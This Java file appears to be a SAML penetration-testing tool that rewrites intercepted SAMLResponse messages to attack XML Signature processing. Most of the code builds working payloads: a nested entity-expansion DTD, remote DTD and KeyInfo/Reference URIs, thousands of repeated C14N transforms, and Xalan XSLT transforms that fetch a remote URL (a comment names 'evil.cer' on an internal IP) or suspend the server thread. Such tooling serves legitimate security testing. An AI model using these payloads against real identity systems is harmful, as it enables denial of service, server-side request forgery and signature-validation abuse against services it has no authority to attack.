package com.isecpartners.samlpummel;


import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URLDecoder;
import java.security.InvalidAlgorithmParameterException;
import java.security.KeyException;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.NoSuchProviderException;
import java.security.SignatureException;
import java.security.UnrecoverableKeyException;
import java.security.cert.CertificateEncodingException;
import java.security.cert.CertificateException;
import java.security.cert.CertificateNotYetValidException;
import java.util.HashMap;
import java.util.Map;

import javax.swing.SwingUtilities;
import javax.xml.crypto.MarshalException;
import javax.xml.crypto.URIReferenceException;
import javax.xml.crypto.dsig.XMLSignature;
import javax.xml.crypto.dsig.XMLSignatureException;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;


import org.w3c.dom.DOMException;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import com.sun.org.apache.xml.internal.security.exceptions.Base64DecodingException;
import com.sun.org.apache.xml.internal.security.utils.Base64;

public class SamlPummel {

	/***********************************
	 * Supported protocol encodings    *
	 ***********************************/
	
	public static final int PROTOCOL_SCAN_ALL = -1; 
	public static final int PROTOCOL_SAML_1_0 = 0;
	public static final int PROTOCOL_SAML_1_1 = 1;
	public static final int PROTOCOL_SAML_2_0 = 2;
	public static final int PROTOCOL_LIBERTY_1_0 = 3;
	public static final int PROTOCOL_LIBERTY_1_1 = 4;
	public static final int PROTOCOL_LIBERTY_2_0 = 5;
	public static final int PROTOCOL_WS_FED_1_0 = 6;
	public static final int PROTOCOL_WS_FED_1_1 = 7;
	
	/******************************** 
    * Supported attack methods      *
    *********************************/
    
    public static final String ATTACK_C14N_FAST = "C14N Transforms"; 
    public static final String ATTACK_REMOTE_DTD = "Remote DTD";
    public static final String ATTACK_REMOTE_KEYINFO_RETRIEVAL_METHOD = "Remote KeyInfo RetrievalMethod";
    public static final String ATTACK_REMOTE_KEYINFO_WSSE_SECURITY_TOKEN_REF = "Remote KeyInfo WSSE Security Token Reference";
    public static final String ATTACK_REMOTE_SIGNEDINFO_REFERENCE = "SignedInfo Remote Reference";
    public static final String ATTACK_XSLT_URL_RETRIEVAL_XALAN = "XSLT Transform URL Retrieval (Xalan)";
    public static final String ATTACK_XSLT_THREAD_SUSPEND_XALAN = "XSLT Transform Thread Suspension (Xalan)";
	public static final String ATTACK_C14N_ENTITY_EXPANSION = "C14N Entity Expansion";

	
	public static final String ATTACK_C14N_FAST_TEXT = "Number"; 
    public static final String ATTACK_REMOTE_DTD_TEXT = "URL";
    public static final String ATTACK_REMOTE_KEYINFO_RETRIEVAL_METHOD_TEXT = "URL";
    public static final String ATTACK_REMOTE_KEYINFO_WSSE_SECURITY_TOKEN_REF_TEXT = "URL";
    public static final String ATTACK_REMOTE_SIGNEDINFO_REFERENCE_TEXT = "URL";
    public static final String ATTACK_XSLT_URL_RETRIEVAL_XALAN_TEXT = "URL";
    public static final String ATTACK_XSLT_THREAD_SUSPEND_XALAN_TEXT = "N/A";
	public static final String ATTACK_C14N_ENTITY_EXPANSION_TEXT = "N/A";
	
	public static final String ATTACK_C14N_FAST_TEXT_DEFAULT = "1000"; 
    public static final String ATTACK_REMOTE_DTD_TEXT_DEFAULT = "http://testurl/test.dtd";
    public static final String ATTACK_REMOTE_KEYINFO_RETRIEVAL_METHOD_TEXT_DEFAULT = "http://testurl/test.xml";
    public static final String ATTACK_REMOTE_KEYINFO_WSSE_SECURITY_TOKEN_REF_TEXT_DEFAULT = "http://testurl/test.xml";
    public static final String ATTACK_REMOTE_SIGNEDINFO_REFERENCE_TEXT_DEFAULT = "http://testurl/test.xml";
    public static final String ATTACK_XSLT_URL_RETRIEVAL_XALAN_TEXT_DEFAULT = "http://testurl/test.xml";
    public static final String ATTACK_XSLT_THREAD_SUSPEND_XALAN_TEXT_DEFAULT = "No Relevant Parameters";
	public static final String ATTACK_C14N_ENTITY_EXPANSION_TEXT_DEFAULT = "No Relevant Parameters";
	
	
	public static final String[] ATTACK_METHODS = {
		ATTACK_C14N_ENTITY_EXPANSION,
		ATTACK_C14N_FAST,
		ATTACK_REMOTE_DTD,
		ATTACK_REMOTE_KEYINFO_RETRIEVAL_METHOD,
		ATTACK_REMOTE_KEYINFO_WSSE_SECURITY_TOKEN_REF,
		ATTACK_REMOTE_SIGNEDINFO_REFERENCE,
		ATTACK_XSLT_URL_RETRIEVAL_XALAN,
		ATTACK_XSLT_THREAD_SUSPEND_XALAN,
	};
	
	public static final String[] ATTACK_METHODS_TEXT = {
		ATTACK_C14N_ENTITY_EXPANSION_TEXT,
		ATTACK_C14N_FAST_TEXT,
		ATTACK_REMOTE_DTD_TEXT,
		ATTACK_REMOTE_KEYINFO_RETRIEVAL_METHOD_TEXT,
		ATTACK_REMOTE_KEYINFO_WSSE_SECURITY_TOKEN_REF_TEXT,
		ATTACK_REMOTE_SIGNEDINFO_REFERENCE_TEXT,
		ATTACK_XSLT_URL_RETRIEVAL_XALAN_TEXT,
		ATTACK_XSLT_THREAD_SUSPEND_XALAN_TEXT
	};
	
	public static final String[] ATTACK_METHODS_TEXT_DEFAULT = {
		ATTACK_C14N_ENTITY_EXPANSION_TEXT_DEFAULT,
		ATTACK_C14N_FAST_TEXT_DEFAULT,
		ATTACK_REMOTE_DTD_TEXT_DEFAULT,
		ATTACK_REMOTE_KEYINFO_RETRIEVAL_METHOD_TEXT_DEFAULT,
		ATTACK_REMOTE_KEYINFO_WSSE_SECURITY_TOKEN_REF_TEXT_DEFAULT,
		ATTACK_REMOTE_SIGNEDINFO_REFERENCE_TEXT_DEFAULT,
		ATTACK_XSLT_URL_RETRIEVAL_XALAN_TEXT_DEFAULT,
		ATTACK_XSLT_THREAD_SUSPEND_XALAN_TEXT_DEFAULT
	};
	
	
	public static byte[] dispatchAttack(String method, String option, byte[] input){
	
		byte[] ane = "Attack not implemented...".getBytes();
		
		try {

			if(method.equals(ATTACK_C14N_ENTITY_EXPANSION)) {
				return injectEntityExpansion(input);
			}
			else if(method.equals(ATTACK_C14N_FAST)) {
				return injectC14NTransforms(input, "", Integer.parseInt(option));
			}
			else if(method.equals(ATTACK_REMOTE_DTD)) {
				return injectRemoteDTD(input, option);
			}
			else if(method.equals(ATTACK_REMOTE_KEYINFO_RETRIEVAL_METHOD)) {
				return attackKeyInfoRM(input, option);
			}
			else if(method.equals(ATTACK_REMOTE_KEYINFO_WSSE_SECURITY_TOKEN_REF)) {
				return attackKeyInfoWsse(input, option);
			}
			else if(method.equals(ATTACK_REMOTE_SIGNEDINFO_REFERENCE)) {
				return addReference(input, option);
			}
			else if(method.equals(ATTACK_XSLT_URL_RETRIEVAL_XALAN)) {
				return addXsltTransform(input, option);
			}
			else if(method.equals(ATTACK_XSLT_THREAD_SUSPEND_XALAN)) {
				return addXsltTransform2(input);
			}
			return ane;
		}
		catch(Exception e) {
			return e.toString().getBytes();
		}
	}
	
	
	private static int _selectedProtocol = -1;
	
	public static void setProtocol(int protocol) {
		if(protocol >= 0 && protocol <= 7) {
			_selectedProtocol = protocol;
		}
		else {
			_selectedProtocol = PROTOCOL_SCAN_ALL;
		}
	}
	
	public static byte[] getSignature(final byte[] in) {
		
		
		switch (_selectedProtocol) {
		case PROTOCOL_SAML_2_0:
			
			return getSignatureBytesFromSaml2_0(in);

		default:
			byte[] retval;
			
			retval = getSignatureBytesFromSaml2_0(in);
			if(retval != null)	{ return retval; }
			
			
			
			break;
		}
	
		return null;
	}

	public static byte[] getSignatureBytesFromSaml2_0(byte[] in) {
		 
		String req = new String(in);
		
		 String valuename = "SAMLResponse=";

		 int start = req.indexOf(valuename); // index of first character of the value name

		 if(start == -1)
		 {
			 return null;
		 }
		 
		 System.out.println("\n\n********************************\n" +
		 					    "Found SAMLResponse= at pos: " + start +
 				                "********************************\n");
		 
		 int end = req.indexOf("&", start); 

		 if(end == -1)
		 {
			 end = req.indexOf("\n", start);
		 }
		 
		 if(end == -1)
		 {
			 end = req.length();
		 }	
		 
		 String encodedSamlResp = req.substring(start + valuename.length(), end);	

		 String urlDecoded = URLDecoder.decode(encodedSamlResp);

		 byte[] decodedMsg;
		 try {
			 decodedMsg = Base64.decode(urlDecoded.getBytes());
		 } catch (Base64DecodingException e) {
			 // TODO Auto-generated catch block
			 e.printStackTrace();
			 return null;
		 }

		 return decodedMsg;
	}
	
	
	public static final Map<String, String> C14N_ALGOS = new HashMap<String, String>();
	
	static {
		C14N_ALGOS.put("Canonical XML", "http://www.w3.org/TR/2001/REC-xml-c14n-20010315");
		C14N_ALGOS.put("Canonical XML with Comments", "http://www.w3.org/TR/2001/REC-xml-c14n-20010315#WithComments");
		C14N_ALGOS.put("Exclusive Canonicalization", "http://www.w3.org/2001/10/xml-exc-c14n#");
	}
	
	
	public static byte[] injectEntityExpansion(byte[] decodedMsg) throws Exception
	{
		// XXX this needs work : what doctype to use?  Different by protocol.
		//  Need to change for applicability to WS-Federation.
	
		String dtd = "<!DOCTYPE samlp:response [\n" + 
				"<!ENTITY a \"1234567890\" >\n" + 
				"<!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;\" >\n" + 
				"<!ENTITY c \"&b;&b;&b;&b;&b;&b;&b;&b;\" >\n" + 
				"<!ENTITY d \"&c;&c;&c;&c;&c;&c;&c;&c;\" >\n" + 
				"<!ENTITY e \"&d;&d;&d;&d;&d;&d;&d;&d;\" >\n" + 
				"<!ENTITY f \"&e;&e;&e;&e;&e;&e;&e;&e;\" >\n" + 
				"<!ENTITY g \"&f;&f;&f;&f;&f;&f;&f;&f;\" >\n" + 
				"<!ENTITY h \"&g;&g;&g;&g;&g;&g;&g;&g;\" >\n" + 
				"<!ENTITY i \"&h;&h;&h;&h;&h;&h;&h;&h;\" >\n" + 
				"<!ENTITY j \"&i;&i;&i;&i;&i;&i;&i;&i;\" >\n" + 
				"<!ENTITY k \"&j;&j;&j;&j;&j;&j;&j;&j;\" >\n" + 
				"<!ENTITY l \"&k;&k;&k;&k;&k;&k;&k;&k;\" >\n" + 
				"<!ENTITY m \"&l;&l;&l;&l;&l;&l;&l;&l;\" >\n" + 
				"]>\n";
		
		byte[] dtdb = dtd.getBytes();
		
		byte[] newbuff = new byte[decodedMsg.length + dtdb.length];
		
		System.arraycopy(dtdb, 0, newbuff, 0, dtdb.length);
		System.arraycopy(decodedMsg, 0, newbuff, dtdb.length, decodedMsg.length);
		
		String bufasstr = new String(newbuff);
		
		// Reference includes a type attribute that is almost never used
		// we'll stash our entity dereference here.  This is not 100%
		// reliable, but much faster than XML-aware mangling of the document.
		int refidx = bufasstr.indexOf("Reference ");
		
		String res = bufasstr.substring(0, refidx + 10) + "type=\"&m;\" " + bufasstr.substring(refidx + 10);
		
		return res.getBytes();
	}
	
	public static byte[] injectRemoteDTD(byte[] decodedMsg, String url) throws Exception
	{
	
		String dtd = "<!DOCTYPE samlp:Response SYSTEM \"" + url + "\">";
		
		byte[] dtdb = dtd.getBytes();
		
		byte[] newbuff = new byte[decodedMsg.length + dtdb.length];
		
		System.arraycopy(dtdb, 0, newbuff, 0, dtdb.length);
		System.arraycopy(decodedMsg, 0, newbuff, dtdb.length, decodedMsg.length);
		
		return newbuff;
	}
	
	
	public static byte[] injectC14NTransforms(byte[] decodedMsg, String algo, int reps) throws Exception
	{
		String msg = new String(decodedMsg);
	
		// some impls only support one algorithm (xml-exc-c14n) and not even
		// the standard C14n from the spec, but others will only sppport the
		// spec-standard algorithm.  Most recent impls support exc-c14n 
		if(algo == null || algo == "") {
			algo = "http://www.w3.org/2001/10/xml-exc-c14n#";
		}
			
		String c14n = "<ds:Transform Algorithm=\"" + algo + "\"/>";
		
		String tag = "<ds:Transforms>";
			
		int idx = msg.indexOf(tag) + tag.length();
		
		int origidx = idx;
		
		byte[] c14nbytes = c14n.getBytes();
		
		byte[] newbuff = new byte[decodedMsg.length + (c14nbytes.length * reps)];
		
		System.arraycopy(decodedMsg, 0, newbuff, 0, idx);
		
		for(int i = 0; i < reps; i++) {
			System.arraycopy(c14nbytes, 0, newbuff, idx, c14nbytes.length);
			idx += c14nbytes.length;
		}
		
		System.arraycopy(decodedMsg, origidx, newbuff, idx, decodedMsg.length - origidx);
		
		return newbuff;
	}
	
	
	/**
	 *
	 */
	public static byte[] attackKeyInfoWsse(byte[] input, String url) 
	throws Exception
	{
		Document doc = getDocument(input);
		
		// attach a malicious keyInfo without resigning the document.
		
		NodeList keyInfos = doc.getElementsByTagNameNS(XMLSignature.XMLNS, "KeyInfo");
		
		if(keyInfos.getLength() == 0) {
			System.err.println("No KeyInfo elements found!");
		}
		
		for(int i = 0; i < keyInfos.getLength(); i++) {
			Node ki = keyInfos.item(i);
			
			Node parent = ki.getParentNode();
			
			Element newKi = doc.createElement("ds:KeyInfo");
			
			Element newRm = doc.createElementNS("http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd", "SecurityTokenReference");
			Element newRmc = doc.createElementNS("http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd", "wsse:Reference");
			newRmc.setAttribute("URI", url);
			
			newRm.appendChild(newRmc);
			
			newKi.appendChild(newRm);
			
			parent.replaceChild(newKi, ki);
		}
		
		return getBytes(doc);
		
	}
	
	
	public static byte[] attackKeyInfoRM(byte[] input, String option) 
	throws Exception
	{
		
		Document doc = getDocument(input);
		// attach a malicious keyInfo without resigning the document.
		
		NodeList keyInfos = doc.getElementsByTagNameNS(XMLSignature.XMLNS, "KeyInfo");
		
		if(keyInfos.getLength() == 0) {
			System.err.println("No KeyInfo elements found!");
		}
		
		for(int i = 0; i < keyInfos.getLength(); i++) {
			Node ki = keyInfos.item(i);
			
			Node parent = ki.getParentNode();
			
			// may need to modify if ds: not bound to xmldsig ns
			Element newKi = doc.createElement("ds:KeyInfo");
			
			Element newRm = doc.createElement("ds:RetrievalMethod");
			
			newRm.setAttribute("URI", option);
						
			newKi.appendChild(newRm);
			
			parent.replaceChild(newKi, ki);
		}
		return getBytes(doc);
	}
	
	public static byte[] addReference(byte[] input, String option) throws Exception {
		Document doc = getDocument(input);
		
		NodeList references = doc.getElementsByTagNameNS(XMLSignature.XMLNS, "Reference");
		
		/*
		  	<ds:Reference URI="#if12395b0f389741440ad845a2fc2d6e1698a0a51">
			<ds:Transforms>
			<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
			<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#">
			<ec:InclusiveNamespaces xmlns:ec="http://www.w3.org/2001/10/xml-exc-c14n#" PrefixList="xsd"/>
			</ds:Transform>
			</ds:Transforms>
			<ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
			<ds:DigestValue>pClbIKchRTzd68417RFwS5sYYyA=</ds:DigestValue>
			</ds:Reference>
		 */
		
		Node rfs = references.item(0);
		
		Node parent = rfs.getParentNode();
		
		Element newRf = doc.createElement("ds:Reference");
		newRf.setAttribute("URI", option);
		
		Element tfs = doc.createElement("ds:Transforms");
		
		Element tf = doc.createElement("ds:Transform");
		tf.setAttribute("Algorithm", "http://www.w3.org/2001/10/xml-exc-c14n#");
		
		Element ec = doc.createElementNS("http://www.w3.org/2001/10/xml-exc-c14n#", "InclusiveNamespaces");
		ec.setAttribute("PrefixList", "xsd");
		
		Element dm = doc.createElement("ds:DigestMethod");
		dm.setAttribute("Algorithnm", "http://www.w3.org/2000/09/xmldsig#sha1");
		
		Element dv = doc.createElement("ds:DigestValue");
		dv.setTextContent("pClbIKchRTzd68417RFwS5sYYyA=");
		
		tf.appendChild(ec);
		tfs.appendChild(tf);
		newRf.appendChild(tfs);
		newRf.appendChild(dm);
		newRf.appendChild(dv);
		
		parent.appendChild(newRf);
		return getBytes(doc);
	}
	
	public static byte[] addXsltTransform(byte[] input, String option) throws Exception {
		
		Document doc = getDocument(input);
		
		NodeList transforms = doc.getElementsByTagNameNS(XMLSignature.XMLNS, "Transforms");
		
		/*
		  		
			<Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
					<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
						xmlns:url="http://xml.apache.org/xalan/java/java.net.URL" 
						xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
						exclude-result-prefixes= "url,ob">
						<xsl:template match="/"> 	  
						  <xsl:variable name="urlObject" select="url:new('http://10.238.18.167/evil.cer')"/>			
						  <xsl:variable name="fetch" select="url:getContent($urlObject)"/>
					      <xsl:variable name="urlAsString"
									    select="ob:toString($urlObject)"/>
						  <xsl:value-of select="$urlAsString"/>
						  <xsl:value-of select="//Assertion"/>
						</xsl:template>
					</xsl:stylesheet>
			</Transform>
		 */
		
	
		Node parent = transforms.item(0);
		
		Element xslt = doc.createElement("ds:Transform");
		xslt.setAttribute("Algorithm", "http://www.w3.org/TR/1999/REC-xslt-19991116");
		
		Element ss = doc.createElement("xsl:stylesheet");
		ss.setAttribute("xmlns:xsl", "http://www.w3.org/1999/XSL/Transform");
		ss.setAttribute("xmlns:url", "http://xml.apache.org/xalan/java/java.net.URL");
		ss.setAttribute("xmlns:ob", "http://xml.apache.org/xalan/java/java.lang.Object");
		ss.setAttribute("exclude-result-prefixes", "url,ob");
		
		Element tm = doc.createElement("xsl:template");
		tm.setAttribute("match", "/");
		
		Element v1 = doc.createElement("xsl:variable");
		v1.setAttribute("name", "urlObject");
		v1.setAttribute("select", "url:new(\'" + option + "\')");
		
		Element v2 = doc.createElement("xsl:variable");
		v2.setAttribute("name", "fetch");
		v2.setAttribute("select", "url:getContent($urlObject)");
		
		Element v3 = doc.createElement("xsl:variable");
		v3.setAttribute("name", "urlAsString");
		v3.setAttribute("select", "ob:toString($urlObject)");
		
		Element vo = doc.createElement("xsl:value-of");
		vo.setAttribute("select", "$urlAsString");
		
		Element vo2 = doc.createElement("xsl:value-of");
		vo2.setAttribute("select", "//Assertion");
		
		
		tm.appendChild(v1);
		tm.appendChild(v2);
		tm.appendChild(v3);
		tm.appendChild(vo);
		tm.appendChild(vo2);
		
		ss.appendChild(tm);
		
		xslt.appendChild(ss);
		
		parent.appendChild(xslt);
		return getBytes(doc);
	}
	
	
	public static byte[] addXsltTransform2(byte[] input) throws Exception {
		
		Document doc = getDocument(input);
		
		NodeList transforms = doc.getElementsByTagNameNS(XMLSignature.XMLNS, "Transforms");
		
		/*
		  		<Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
					<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
						xmlns:thread="http://xml.apache.org/xalan/java/java.lang.Thread" 
						xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
						exclude-result-prefixes="thread,ob">
						<xsl:template match="/"> 	  
						  <xsl:variable name="threadObject" select="thread:currentThread()"/>			
						  <xsl:variable name="suspend" select="thread:suspend($threadObject)"/>
					      <xsl:variable name="threadAsString"
									    select="ob:toString($threadObject)"/>
						  <xsl:value-of select="$threadAsString"/>
						</xsl:template>
					</xsl:stylesheet>
					</Transform>
		
		 */
		
	
		Node parent = transforms.item(0);
		
		Element xslt = doc.createElement("ds:Transform");
		xslt.setAttribute("Algorithm", "http://www.w3.org/TR/1999/REC-xslt-19991116");
		
		Element ss = doc.createElement("xsl:stylesheet");
		ss.setAttribute("xmlns:xsl", "http://www.w3.org/1999/XSL/Transform");
		ss.setAttribute("xmlns:thread", "http://xml.apache.org/xalan/java/java.lang.Thread");
		ss.setAttribute("xmlns:ob", "http://xml.apache.org/xalan/java/java.lang.Object");
		ss.setAttribute("exclude-result-prefixes", "thread,ob");
		
		Element tm = doc.createElement("xsl:template");
		tm.setAttribute("match", "/");
		
		Element v1 = doc.createElement("xsl:variable");
		v1.setAttribute("name", "threadObject");
		v1.setAttribute("select", "thread:currentThread()");
		
		Element v2 = doc.createElement("xsl:variable");
		v2.setAttribute("name", "suspend");
		v2.setAttribute("select", "thread:suspend()");
		
		Element v3 = doc.createElement("xsl:variable");
		v3.setAttribute("name", "threadAsString");
		v3.setAttribute("select", "ob:toString($threadObject)");
		
		Element vo = doc.createElement("xsl:value-of");
		vo.setAttribute("select", "$threadAsString");
		
		Element vo2 = doc.createElement("xsl:value-of");
		vo2.setAttribute("select", "//Assertion");
		
		
		tm.appendChild(v1);
		tm.appendChild(v2);
		tm.appendChild(v3);
		tm.appendChild(vo);
		tm.appendChild(vo2);
		
		ss.appendChild(tm);
		
		xslt.appendChild(ss);
		
		parent.appendChild(xslt);
		
		return getBytes(doc);
	}
	
	
	
	private static Document getDocument(byte[] decodedMsg) throws Exception{
		ByteArrayInputStream bais = new ByteArrayInputStream(decodedMsg);

		DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
		factory.setNamespaceAware(true);			
		DocumentBuilder builder = factory.newDocumentBuilder();

		return builder.parse(bais);
	}
	
	private static byte[] getBytes(Document doc) throws Exception {
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		
		TransformerFactory tf = TransformerFactory.newInstance();
		Transformer trans = tf.newTransformer();
		trans.setOutputProperty("omit-xml-declaration", "yes");
		trans.setOutputProperty("indent", "no");
		trans.transform(new DOMSource(doc), new StreamResult(baos));
		
	    return baos.toByteArray();
	}
	
	public static void main(String[] argc) throws Exception{
		
		File file = new File("223-request");
		
		InputStream is = new FileInputStream(file);
	    
        // Get the size of the file
        long length = file.length();
    
        // You cannot create an array using a long type.
        // It needs to be an int type.
        // Before converting to an int type, check
        // to ensure that file is not larger than Integer.MAX_VALUE.
        if (length > Integer.MAX_VALUE) {
            // File is too large
        }
    
        // Create the byte array to hold the data
        byte[] bytes = new byte[(int)length];
    
        // Read in the bytes
        int offset = 0;
        int numRead = 0;
        while (offset < bytes.length
               && (numRead=is.read(bytes, offset, bytes.length-offset)) >= 0) {
            offset += numRead;
        }
    
        // Ensure all the bytes have been read in
        if (offset < bytes.length) {
            throw new IOException("Could not completely read file "+file.getName());
        }
    
        // Close the input stream and return bytes
        is.close();
        
        System.out.println(new String(bytes));
        
        System.out.println("\n\n");
        
        byte[] payload = getSignature(bytes);
        
        System.out.println(new String(payload));
        
	    final PummelFrame pf = new PummelFrame(payload);
	
        try {
            SwingUtilities.invokeAndWait(new Runnable() {
                public void run() {
                    pf.setVisible(true);
                    pf.toFront();
                    pf.requestFocus();
                }
            });
        } catch (Exception e) {
            System.err.println("Error loading GUI: " + e.getMessage());
            System.exit(1);
        }
       
	    payload = pf.getNewPayload();
        
	    System.out.println("\n\nNew payload: \n\n");
	    
	    System.out.println(new String(payload));
	}
	
	
	public static byte[] attackSAMLResponse(byte[] in) throws Exception
	{
		System.out.println("In SamlPummel.attackSAMLResponse()");
		System.out.println("Got payload " + new String(in));
		
		byte[] payload = getSignature(in);
		
		if(payload == null) {
			return in; 
		
		}
		
		final PummelFrame pf = new PummelFrame(payload);
		
        try {
            SwingUtilities.invokeAndWait(new Runnable() {
                public void run() {
                    pf.setVisible(true);
                    pf.toFront();
                    pf.requestFocus();
                }
            });
        } catch (Exception e) {
            System.err.println("Error loading GUI: " + e.getMessage());
            System.exit(1);
        }
       
	    payload = pf.getNewPayload();
	    
	    return payload;
	}
	
}
